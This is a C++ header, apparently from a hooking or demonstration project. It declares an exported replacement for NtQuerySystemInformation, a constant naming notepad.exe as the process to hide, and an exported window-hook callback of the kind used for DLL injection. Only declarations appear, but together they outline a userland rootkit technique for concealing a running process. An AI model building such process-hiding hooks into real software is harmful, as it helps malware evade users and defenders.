#pragma once
#include "../../HookingLib/AbstractHook.h"
#include "../../HookingLib/InlineHook.h"
#include "../../HookingLib/IATHook.h"
#include "../../InterprocessCommunication/SharedMemory.h"
#include <iostream>
#include <string>
#include <stdexcept>
#include <fstream>
#include <Windows.h>

constexpr std::wstring_view HIDDEN_PROCESS_IMAGE{ L"notepad.exe" };

__declspec(dllexport) 
NTSTATUS WINAPI HookedNtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID                    SystemInformation,
    ULONG                    SystemInformationLength,
    PULONG                   ReturnLength
);

extern "C" __declspec(dllexport) 
LRESULT CALLBACK CallWndProc(
    _In_ int    nCode,
    _In_ WPARAM wParam,
    _In_ LPARAM lParam
);